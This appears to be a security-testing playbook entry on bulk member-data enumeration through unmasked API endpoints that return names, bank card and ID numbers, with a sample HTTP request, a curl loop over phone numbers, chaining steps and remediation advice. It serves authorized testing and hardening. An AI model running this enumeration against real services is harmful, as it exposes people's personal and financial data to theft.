---
title: Bulk member-privacy queries / account enumeration (phone numbers, bank cards)
cve: None (implementation flaw)
severity: high
cvss: 7.5
product: Support queries / agent reports / member-center endpoints
versions: Any
ports: 80, 443
keywords: member, enumeration, phone numbers, bank cards, privacy, bulk queries
entry: /api/member/info?phone= returns other users' profiles one by one
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

```
/api/member/info?phone=13800138000     /api/user/query?id=
/api/cs/member/search?keyword=         /api/agent/member?phone=
Response includes realName, bankCard, idCard, balance
```

## Prerequisites

- An account (support/agent roles are more common, but member endpoints often expose the same functionality).

## PoC

```http
GET /api/member/info?phone=13800138000 HTTP/1.1
Authorization: Bearer <token>
```

```bash
# Sample-based enumeration (rate-limit! Prove enumerability only; do not build a database)
for p in 13800138000 13800138001 13800138002; do
  curl -s "https://target/api/member/info?phone=$p" -H "Authorization: Bearer <token>" \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("data",{}).get("phone"),d.get("data",{}).get("realName"))'
  sleep 2
done
```

## Exploitation Steps

1. Confirm your own phone number returns your own profile (baseline).
2. Substitute another phone number (from the authorized test list) and check for a name/card number — the key question is **whether it is masked**.
3. Confirmation: another user's unmasked PII ⇒ privacy disclosure; arbitrary uid/phone queries ⇒ bulk access possible.
4. Chain: `member-data-enumeration` + `sms-bomb-and-enum.md` (existence) + `withdraw-approval-idor.md` (card numbers) forms a complete path.
5. Evidence: retain only 1-2 redacted records; report the "enumerable field set + recommended masking rules".

## Remediation and Mitigation (Hardening)

- Require authentication + roles + row-level authorization on query endpoints; audit support queries (who queried whom).
- Mask PII by default (first character of names, last four card digits, masked middle identity-number digits); require additional authorization for bulk queries.
- Rate-limit endpoints + alert on anomalous queries (one account frequently querying different phone numbers).

## References

- OWASP WSTG-IDNT-04; minimum-necessary principle under the Personal Information Protection Law (hardening item).
